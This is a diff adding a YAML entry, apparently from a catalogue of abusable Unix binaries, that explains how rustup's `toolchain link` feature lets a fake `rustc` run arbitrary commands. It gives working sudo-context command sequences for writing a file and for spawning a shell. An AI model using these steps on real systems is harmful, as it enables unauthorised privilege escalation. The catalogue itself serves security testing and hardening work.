@@ -1,0 +1,27 @@
+---
+comment: |-
+  rustup is the Rust toolchain manager. It can be abused via the `toolchain link` feature to register arbitrary directories as toolchains. By placing a malicious binary at `bin/rustc`, attackers can execute arbitrary commands when invoking `rustc` through rustup.
+functions:
+  file-write:
+  - code: |-
+      mkdir -p /tmp/fake/bin
+      echo -e '#!/bin/sh\necho hacked > /tmp/pwned' > /tmp/fake/bin/rustc
+      chmod +x /tmp/fake/bin/rustc
+      rustup toolchain link pwn /tmp/fake
+      rustup run pwn rustc
+    contexts:
+      sudo:
+        comment: |-
+          Register a fake toolchain whose `rustc` writes arbitrary content to a file.
+  shell:
+  - code: |-
+      mkdir -p /tmp/fake/bin
+      echo -e '#!/bin/sh\n/bin/sh' > /tmp/fake/bin/rustc
+      chmod +x /tmp/fake/bin/rustc
+      rustup toolchain link pwn /tmp/fake
+      rustup run pwn rustc
+    contexts:
+      sudo:
+        comment: |-
+          Abuse `rustup toolchain link` to spawn a shell by registering a fake toolchain.
+...
